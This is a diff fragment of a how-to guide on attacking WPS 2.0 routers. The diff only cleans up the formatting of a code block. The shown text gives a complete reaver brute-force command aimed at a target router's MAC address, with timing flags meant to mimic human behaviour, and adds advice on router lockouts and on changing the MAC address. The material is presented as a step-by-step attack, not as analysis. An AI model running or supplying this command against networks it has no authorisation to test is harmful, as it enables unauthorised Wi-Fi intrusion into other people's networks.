@@ -5,10 +5,7 @@ To work with routers that use WPS 2.0, you’ll need to follow a more advanced a
 ## Steps for WPS 2.0 Attack:
 Run reaver with the following command:
 
-bash
-Copy
-Edit
-reaver -i wlan0 -c 1 -b TARGET_ROUTER_MAC -vv -L -N -d 15 -T .5 -r 3:20
+'''reaver -i wlan0 -c 1 -b TARGET_ROUTER_MAC -vv -L -N -d 15 -T .5 -r 3:20'''
 This command adjusts the timing to simulate human behavior, but note that you will eventually lock the router after 3-4 attempts. Changing your MAC address after 1-2 attempts won’t help—the router will still lock.
 
 If you get locked out, you’ll need to reset the router to clear the locked state.
